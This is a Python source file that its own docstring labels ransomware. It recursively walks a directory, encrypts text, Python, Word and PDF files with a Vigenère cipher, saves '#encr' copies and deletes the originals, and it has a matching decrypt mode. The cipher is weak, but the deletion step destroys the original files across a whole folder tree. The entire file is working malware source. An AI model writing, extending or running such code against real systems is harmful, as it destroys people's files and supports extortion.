#!/usr/bin/env python3
import os
import docx
import fitz
from vigenere_ciphers import encrypt_vigenere, decrypt_vigenere

"""
Ransomware txt, py, docx, pdf file handling for
vigenere encryption and decryption
"""

def process_files(directory_path, operation, key):
    for dir_path, dir_names, file_names in os.walk(directory_path):
        for file in file_names:
            file_name, file_extension = os.path.splitext(file)
            os.chdir(dir_path)

            if file_extension == ".txt" or file_extension == ".py":
                with open(file, "rb") as target_file:
                    contents = target_file.read()
                    if operation == "encrypt":
                        ciphertext = encrypt_vigenere(contents.decode('utf-8'), key)
                        processed_file_name = f"{file_name}#encr{file_extension}"
                    elif operation == "decrypt":
                        ciphertext = contents.decode('utf-8')
                        ciphertext = decrypt_vigenere(ciphertext, key)
                        processed_file_name = f"{file_name.replace('#encr', '')}{file_extension}"
                    encrypted_bytes = ciphertext.encode('utf-8')

                with open(processed_file_name, "wb") as processed_file:
                    processed_file.write(encrypted_bytes)
                    if operation == "encrypt":
                        os.remove(file)
                    os.chdir(directory_path)

            elif file_extension == ".docx":
                doc_path = os.path.join(dir_path, file)
                doc = docx.Document(doc_path)

                processed_paragraphs = []
                for paragraph in doc.paragraphs:
                    text = paragraph.text
                    if operation == "encrypt":
                        processed_text = encrypt_vigenere(text, key)
                        processed_doc_path = os.path.join(dir_path, f"{file_name}#encr{file_extension}")
                    elif operation == "decrypt":
                        processed_text = decrypt_vigenere(text, key)
                        processed_doc_path = os.path.join(dir_path, f"{file_name.replace('#encr', '')}{file_extension}")
                    processed_paragraphs.append(processed_text)

                # Save the encrypted/decrypted contents back to the docx file
                for p, text in zip(doc.paragraphs, processed_paragraphs):
                    p.text = text
                    
                doc.save(processed_doc_path)
                if operation == "encrypt":
                    os.remove(doc_path)

            elif file_extension == ".pdf":
                pdf_path = os.path.join(dir_path, file)

                if operation == "encrypt":
                    processed_pdf_path = os.path.join(dir_path, f"{file_name}#encr{file_extension}")
                elif operation == "decrypt":
                    processed_pdf_path = os.path.join(dir_path, f"{file_name.replace('#encr', '')}{file_extension}")

                pdf = fitz.open(pdf_path)
                processed_pdf = fitz.open()

                for page in pdf:
                    text = page.get_text()
                    if operation == "encrypt":
                        processed_text = encrypt_vigenere(text, key)
                    elif operation == "decrypt":
                        processed_text = decrypt_vigenere(text, key)

                    # Create a new page in the processed PDF
                    processed_page = processed_pdf.new_page(width=page.rect.width, height=page.rect.height)

                    # Insert the encrypted/decrypted text into the page
                    processed_page.insert_text((50, 50), processed_text)

                # Save and close the processed PDF
                processed_pdf.save(processed_pdf_path)
                processed_pdf.close()

                if operation == "encrypt":
                    os.remove(pdf_path)
